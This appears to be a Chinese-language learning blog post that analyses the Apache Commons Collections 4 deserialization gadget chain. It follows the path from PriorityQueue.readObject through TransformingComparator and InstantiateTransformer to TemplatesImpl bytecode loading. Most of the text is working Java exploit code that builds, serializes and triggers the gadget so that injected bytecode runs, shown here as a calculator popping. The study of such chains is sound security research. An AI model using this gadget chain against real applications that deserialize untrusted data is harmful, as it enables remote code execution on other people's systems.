复用字节码加载方式学完之前的三条链，之后的内容就很简单了
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;  import com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;  import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;  import org.apache.commons.collections.Transformer;  import org.apache.commons.collections.functors.ChainedTransformer;  import org.apache.commons.collections.functors.ConstantTransformer;  import org.apache.commons.collections.functors.InstantiateTransformer;  import org.apache.commons.collections.functors.InvokerTransformer;    import javax.xml.crypto.dsig.Transform;  import javax.xml.transform.Templates;  import java.lang.reflect.Field;  import java.nio.file.Files;  import java.nio.file.Paths;    public class cc4stu &#123;      public static void main(String[] args) throws Exception &#123;          TemplatesImpl templates = new TemplatesImpl();          Class&lt;? extends TemplatesImpl&gt; aClass = templates.getClass();          Field name = aClass.getDeclaredField(&quot;_name&quot;);          name.setAccessible(true);          name.set(templates,&quot;nihao&quot;);          byte[] bytes = Files.readAllBytes(Paths.get(&quot;C://nihao.class&quot;));            Field bytecodes = aClass.getDeclaredField(&quot;_bytecodes&quot;);          bytecodes.setAccessible(true);          bytecodes.set(templates,new byte[][]&#123;bytes&#125;);            Field tfactory = aClass.getDeclaredField(&quot;_tfactory&quot;);          tfactory.setAccessible(true);          tfactory.set(templates, new TransformerFactoryImpl() );  //        templates.newTransformer();          InstantiateTransformer instantiateTransformer = new InstantiateTransformer(new Class[]&#123;Templates.class&#125;, new Object[]&#123;templates&#125;);  //        instantiateTransformer.transform(TrAXFilter.class);          instantiateTransformer.transform(TrAXFilter.class);        &#125;  &#125;
按照之前加载字节码的方式弹出计算器
TransformingComparator 的 compare 方法接下来就找谁调用了transformer方法‘我们在TransformingComparator.java找到了这个方法
public int compare(Object obj1, Object obj2) &#123;      Object value1 = this.transformer.transform(obj1);      Object value2 = this.transformer.transform(obj2);      return this.decorated.compare(value1, value2);  &#125;

PriorityQueue 与比较器调用接着找谁调用了compare我们在PriorityQueue.java找到了siftDownUsingComparator
private void siftDownUsingComparator(int k, E x) &#123;      int half = size &gt;&gt;&gt; 1;      while (k &lt; half) &#123;          int child = (k &lt;&lt; 1) + 1;          Object c = queue[child];          int right = child + 1;          if (right &lt; size &amp;&amp;              comparator.compare((E) c, (E) queue[right]) &gt; 0)              c = queue[child = right];          if (comparator.compare(x, (E) c) &lt;= 0)              break;          queue[k] = c;          k = child;      &#125;      queue[k] = x;  &#125;

反序列化入口 readObject我们看这个类的入口类
private void readObject(java.io.ObjectInputStream s)      throws java.io.IOException, ClassNotFoundException &#123;      // Read in size, and any hidden stuff      s.defaultReadObject();        // Read in (and discard) array length      s.readInt();        queue = new Object[size];        // Read in all elements.      for (int i = 0; i &lt; size; i++)          queue[i] = s.readObject();        // Elements are guaranteed to be in &quot;proper order&quot;, but the      // spec has never explained what that might be.        heapify();  &#125;

heapify 与 siftDown接着跟进heapify这个方法
private void heapify() &#123;      for (int i = (size &gt;&gt;&gt; 1) - 1; i &gt;= 0; i--)          siftDown(i, (E) queue[i]);  &#125;
接着跟进siftdown
private void siftDown(int k, E x) &#123;      if (comparator != null)          siftDownUsingComparator(k, x);      else          siftDownComparable(k, x);  &#125;
形成闭合了。这些都是在同一个类里的，这条链也就几乎完成了入口readobject调用heapify，heapify调用siftdown，它有调用siftDownUsingComparator，里面调用了compare，他又调用了transform，形成这一阶段的闭合
实验代码接着编写exp
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;  import com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;  import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;  import org.apache.commons.collections4.comparators.TransformingComparator;  import org.apache.commons.collections4.Transformer;  import org.apache.commons.collections4.functors.ChainedTransformer;  import org.apache.commons.collections4.functors.ConstantTransformer;  import org.apache.commons.collections4.functors.InstantiateTransformer;  import org.apache.commons.collections4.functors.InvokerTransformer;    import javax.xml.crypto.dsig.Transform;  import javax.xml.transform.Templates;  import java.io.ByteArrayInputStream;  import java.io.ByteArrayOutputStream;  import java.io.ObjectInputStream;  import java.io.ObjectOutputStream;  import java.lang.reflect.Field;  import java.nio.file.Files;  import java.nio.file.Paths;  import java.util.PriorityQueue;    public class cc4stu &#123;      public static void main(String[] args) throws Exception &#123;          TemplatesImpl templates = new TemplatesImpl();          Class&lt;? extends TemplatesImpl&gt; aClass = templates.getClass();          Field name = aClass.getDeclaredField(&quot;_name&quot;);          name.setAccessible(true);          name.set(templates,&quot;nihao&quot;);          byte[] bytes = Files.readAllBytes(Paths.get(&quot;C://nihao.class&quot;));            Field bytecodes = aClass.getDeclaredField(&quot;_bytecodes&quot;);          bytecodes.setAccessible(true);          bytecodes.set(templates,new byte[][]&#123;bytes&#125;);            Field tfactory = aClass.getDeclaredField(&quot;_tfactory&quot;);          tfactory.setAccessible(true);          tfactory.set(templates, new TransformerFactoryImpl() );  //        templates.newTransformer();          InstantiateTransformer instantiateTransformer = new InstantiateTransformer(new Class[]&#123;Templates.class&#125;, new Object[]&#123;templates&#125;);  //        instantiateTransformer.transform(TrAXFilter.class);  //        instantiateTransformer.transform(TrAXFilter.class);          Transformer[] transformers = new Transformer[]&#123;                  new ConstantTransformer(TrAXFilter.class),                  instantiateTransformer          &#125;;          ChainedTransformer chainedTransformer = new ChainedTransformer&lt;&gt;(transformers);          TransformingComparator transformingComparator = new TransformingComparator(chainedTransformer);              PriorityQueue&lt;Object&gt; queue = new PriorityQueue&lt;&gt;(2,transformingComparator);          queue.add(1);          queue.add(2);            // ===== 新增：序列化 =====        byte[] ser = serialize(queue);          System.out.println(&quot;[*] serialized bytes length = &quot; + ser.length);            // ===== 新增：反序列化 =====        deserialize(ser);      &#125;        // ===== 新增：序列化方法 =====    public static byte[] serialize(Object obj) throws Exception &#123;          ByteArrayOutputStream bos = new ByteArrayOutputStream();          ObjectOutputStream oos = new ObjectOutputStream(bos);          oos.writeObject(obj);          oos.flush();          oos.close();          return bos.toByteArray();      &#125;        // ===== 新增：反序列化方法 =====    public static Object deserialize(byte[] data) throws Exception &#123;          ByteArrayInputStream bis = new ByteArrayInputStream(data);          ObjectInputStream ois = new ObjectInputStream(bis);          Object obj = ois.readObject();          ois.close();          return obj;      &#125;  &#125;
弹出计算器

